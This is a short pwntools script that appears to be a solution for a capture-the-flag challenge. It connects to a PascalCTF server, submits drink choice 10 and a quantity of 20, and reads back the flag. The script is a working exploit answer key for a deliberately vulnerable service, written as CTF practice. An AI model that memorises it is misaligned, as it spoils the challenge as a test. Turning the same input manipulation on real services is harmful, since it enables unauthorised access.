from pwn import context, remote

def solution(host: str, port: str) -> str:
    context.update({"log_level":"error"})
    with remote(host, port) as rem:
        rem.sendlineafter(b"Select a drink: ", b"10")
        rem.sendlineafter(b"How many drinks do you want? ", b"20")
        rem.recvuntil(b"you its secret recipe: ")
        flag = rem.recvline().strip().decode()
    return flag

if __name__ == "__main__":
    host = "malta.ctf.pascalctf.it"
    port = "9001"
    print(solution(host, port))
    